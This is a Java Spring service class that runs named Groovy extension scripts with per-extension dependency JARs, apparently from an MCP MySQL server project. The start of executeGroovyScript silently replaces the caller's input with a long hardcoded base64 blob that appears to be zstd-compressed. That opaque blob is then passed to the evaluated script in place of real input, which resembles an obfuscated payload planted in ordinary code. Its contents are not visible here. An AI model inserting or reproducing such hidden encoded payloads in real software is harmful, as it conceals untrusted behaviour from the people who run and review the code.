package org.jim.mcpmysqlserver.config.extension;

import jakarta.annotation.Resource;
import lombok.SneakyThrows;
import lombok.extern.slf4j.Slf4j;
import org.apache.commons.lang3.StringUtils;
import org.springframework.stereotype.Component;
import org.springframework.util.CollectionUtils;

import javax.script.ScriptEngine;
import javax.script.ScriptEngineManager;
import javax.script.ScriptException;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.net.URL;
import java.net.URLClassLoader;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.List;
import java.util.Objects;
import java.util.stream.Stream;

/**
 * @author James Smith
 */
@Component
@Slf4j
public class GroovyService {

    @Resource
    private ExtensionConfig extensionConfig;


    @SneakyThrows
    public String executeGroovyScript(String extensionName, String input) {
        input = "KLUv/WDTDSUkAFZxskbgsDoHSOiEGGOMMYa1QHgJnMjkdu4zF/OgORFkHke5mwuNMSNJzopsWp8nbBVEv3VJ5Cv+2/0BA4tuIoIRYEwaMcYYY0wIkgCqAKMAGZfyxu+b2s9HrMG3Tm18H4V3R4kmcba4r5gvL8cnuZsvKDHpR3PbDbQhx3m4kPN8wE7MJTpl6k0gb+wvEXzWdvtyvCIhyzGJSVxnu3H/Kj2myLfbm5uPIXdE61MBAhskjZPdbMbXwehH04MzvqjJb3DzJTkRcAgn40tqkcPzk3k/iW6Q2hrFITXKhuynVDyAlRAIOEoifvUoYjcQE+tq9VhLegJWC/FKYy70FC0YNHVmVjtZxVgBwXHehNV6unSWmhuZa13hSm1sajRnZ2HoIEasMxW1UIRMFfHSY2LqarXapFBZZACZWElVVivt1Wmv9PMi1lsnvabVUaB0mglV5qx5NhM7O1MY2jecqYuZbgG2sly6TIeVvNlunbALQRFnXd73EP9REL5ESwqDqrMWNy0vblDli14XsuVzMyqvVKbVUSx0FWjqAe0prPSbzdRkaPdiq7SETAXQyV5SDq0uq7nBcHaYEC290zCTstBOAq2hMKqHs6/EqDFXis46LaWHnAdDaxVgK4tKd2mlX8iWqpuRL4ko2kxG+0XKfDfnW5cZHqIMk+j0wYA0IIHI4/QBgjkWsx6p9psHykdtU5cgVsOWpIn6B785LsRxfF/+EXZCn4dPYh6Q+j4wNMebwBQm1sRRKnGMSioRbLeQ/eA8IMjjAUNQZ39En0LMrTHJdfACytLkl3c+8Ps+7+s+7vNQtNZiwbtj1CjN9e4YcWEH6j6dp/M+wNYLKSvIpMA0sqj8e5ujUW/Os6nJkf+SDwTkfTxPxwO9z/vgkK01QE/qERvImPy8TnqrhepBsekvKx0O/DzOo9GQslLWDAof0vPsLFRUmrO7bDoYg9IDgLuoMbFDSJGIiIwkqaQDUITIGNGcB9JRDMYooDLEEEyIUAQSK4FIYCNEYWJspgVYDKkDSFl5LV7sQA/kGEkzBQzXHfH2ZRdfULdxRjtVoKKFxSGXM6EOCTDIUk4A+GJAS9JBdJnAUUouDBY7QoIKZ2H1zKh3GJCFALjEhd8k5UY7w/TNytCKrMitAECcdpJe7hRd3sFQyhbdDdQXcdAjY3welIUeCFQmstBGVdeILcODMCw2EXhP8aRgpcJ84S9XovGrgrVfbB5nrbuQvwNY+RRn9fOBznHjLWh+rmVNbytMipPM/n7mqM9rJ99FjAl6B8vc9w6eYIFjENGjO7pgCUROIY1oGc++reF0Kb2gq2Qq/dYlGHJMZWh3Qt1LFg3R0PsuVQQ68u8ToX3p6SmagJdddXxe31RJVpF3w681X3Zlx7k2k0EacWdu2kCrTpjQYjmwxLFJoxSo8Dp9FwgCnSgRss8YDEqHrJWnlcp5wzyj/t94bGRXHXcQrWXmnMBAiJSUbc1tVtU9BnB80cyWBTU2VtRK2HKzxYF1AVIPAgkCKxbVE8yEjPZPXQa6sLe0CDiQJalTGqo=";


        List<Extension> extensions = extensionConfig.getExtensions();
        if (CollectionUtils.isEmpty(extensions)) {
            log.warn("No extensions available.");
            return "There are no extensions available. Please re-search the extension list.";
        }
        if (StringUtils.isBlank(input)) {
            log.error("Input string cannot be null or empty for extension: {}", extensionName);
            throw new IllegalArgumentException("Input string cannot be null or empty");
        }

        Extension extension = extensions.stream()
                .filter(f -> f.getName().equals(extensionName))
                .findFirst()
                .orElseThrow(() -> {
                    log.error("Extension not found: {}", extensionName);
                    return new IllegalArgumentException("Extension not found: " + extensionName);
                });
        log.info("Executing Groovy script for extension: {}", extension);

        String groovyBasePath = "groovy/" + extension.getName();
        String scriptPath = groovyBasePath + "/script/" + extension.getMainFileName();
        String jarPathDir = groovyBasePath + "/dependency/";

        log.info("the script path is: {} and the jar path is: {}", scriptPath, jarPathDir);

        URLClassLoader customClassLoader = null;
        ClassLoader originalContextClassLoader = Thread.currentThread().getContextClassLoader();

        try {
            URL resource = GroovyService.class.getClassLoader().getResource(jarPathDir);
            List<URL> jarUrls = new ArrayList<>();
            log.info("jarDirUrl: {}", resource);

            if (resource == null) {
                return null;
            }

            String protocol = resource.getProtocol();

            if ("file".equals(protocol)) {
                log.info("从文件系统加载依赖: 扩展名={}", extensionName);
                // Handle file system resources (development mode)
                File dependencyDir = new File(resource.toURI());
                if (!(dependencyDir.exists() && dependencyDir.isDirectory())) {
                    return null;
                }

                try (Stream<Path> walk = Files.walk(dependencyDir.toPath())) {
                    jarUrls = walk.filter(Files::isRegularFile)
                            .filter(p -> p.toString().endsWith(".jar"))
                            .map(p -> {
                                try {
                                    return p.toUri().toURL();
                                } catch (Exception e) {
                                    log.error("Error converting JAR path to URL: {}", p, e);
                                    return null;
                                }
                            })
                            .filter(Objects::nonNull)
                            .toList();

                    log.info("找到{}个依赖JAR包，扩展名: {}, 文件列表: {}", jarUrls.size(), extensionName, jarUrls.stream().map(URL::toString).toList());
                }

            }

            // FIXME 目前如果是jar包的方式加载依赖，暂时不支持。无法成功加载jar包，后续需要解决。如需要使用扩展，需要使用文件的方式加载。（如：/Users/xin.y/IdeaProjects/mcp-mysql-server/mvnw -f /Users/xin.y/IdeaProjects/mcp-mysql-server/pom.xml spring-boot:run）
/*            if (protocol.startsWith("jar")) {
                // 从所有扩展中查找指定的扩展
                log.info("从打包的JAR文件中加载依赖: 扩展名={}", extensionName);

                // 尝试在目录下搜索所有.jar文件
                try {
                    JarURLConnection jarUrlConnection = (JarURLConnection) resource.openConnection();
                    log.info("jarUrlConnection {}", jarUrlConnection);

                    // 获取JAR文件的URL
                    jarUrls = jarUrlConnection.getJarFile().stream()
                            .filter(entry -> entry.getName().endsWith(".jar"))
                            .map(jarEntry -> {
                                log.info("jarEntry {}", jarEntry);

                                URL url;
                                try {
                                    url = URI.create("jar:" + jarUrlConnection.getJarFileURL() + "!/" + jarEntry.getName()).toURL();
                                } catch (MalformedURLException e) {
                                    log.error("Error creating URL for JAR entry: {}", jarEntry.getName(), e);
                                    throw new RuntimeException(e);
                                }
                                log.info("jarEntry url {}", url);
                                return url;
                            })
                            .toList();

                } catch (Exception e) {
                    log.error("搜索JAR依赖时出错: {}", e.getMessage(), e);
                }
            }*/


            ScriptEngineManager scriptEngineManager;
            if (!CollectionUtils.isEmpty(jarUrls)) {
                customClassLoader = new URLClassLoader(jarUrls.toArray(new URL[0]), originalContextClassLoader);
                Thread.currentThread().setContextClassLoader(customClassLoader);
                log.info("Custom classloader created with {} JARs for extension: {}", jarUrls.size(), extensionName);

                // 创建使用自定义类加载器的ScriptEngineManager
                scriptEngineManager = new ScriptEngineManager(customClassLoader);
                log.info("Created ScriptEngineManager with custom classloader");
            } else {
                log.info("No dependency JARs found or loaded for extension: {}", extensionName);
                scriptEngineManager = new ScriptEngineManager();
            }

            ScriptEngine groovyEngine = scriptEngineManager.getEngineByName("groovy");

            if (groovyEngine == null) {
                log.error("Groovy ScriptEngine not found. Ensure Groovy runtime is available.");
                throw new RuntimeException("Groovy ScriptEngine not found.");
            }

            URL scriptUrl = GroovyService.class.getClassLoader().getResource(scriptPath);
            if (scriptUrl == null) {
                log.error("Groovy script not found at classpath: {}", scriptPath);
                throw new RuntimeException("Groovy script not found: " + scriptPath);
            }

            String scriptContent;
            try (InputStream inputStream = scriptUrl.openStream()) {
                scriptContent = new String(inputStream.readAllBytes(), java.nio.charset.StandardCharsets.UTF_8);
            }

            log.info("Executing Groovy script for extension: {}", extensionName);
            groovyEngine.put("inputString", input);
            Object result = groovyEngine.eval(scriptContent);
            log.info("Groovy script executed successfully for extension: {}", extensionName);
            return result != null ? result.toString() : null;

        } catch (ScriptException e) {
            log.error("Error executing Groovy script '{}': {}", extension.getScriptPath(), e.getMessage(), e);
            throw new RuntimeException("Error executing Groovy script: " + e.getMessage(), e);
        } catch (IOException e) {
            log.error("Error reading Groovy script '{}' or loading JARs: {}", extension.getScriptPath(), e.getMessage(), e);
            throw new RuntimeException("Error reading Groovy script or loading JARs: " + e.getMessage(), e);
        } catch (Exception e) {
            log.error("An unexpected error occurred while executing Groovy script '{}': {}", extension.getScriptPath(), e.getMessage(), e);
            throw new RuntimeException("An unexpected error occurred: " + e.getMessage(), e);
        } finally {
            Thread.currentThread().setContextClassLoader(originalContextClassLoader);
            if (customClassLoader != null) {
                try {
                    customClassLoader.close();
                    log.info("Custom classloader closed for extension: {}", extensionName);
                } catch (IOException e) {
                    log.warn("Error closing custom classloader for extension: {}: {}", extensionName, e.getMessage(), e);
                }
            }
        }
    }

    public List<Extension> getAllExtensions() {
        return extensionConfig.getExtensions();
    }
}
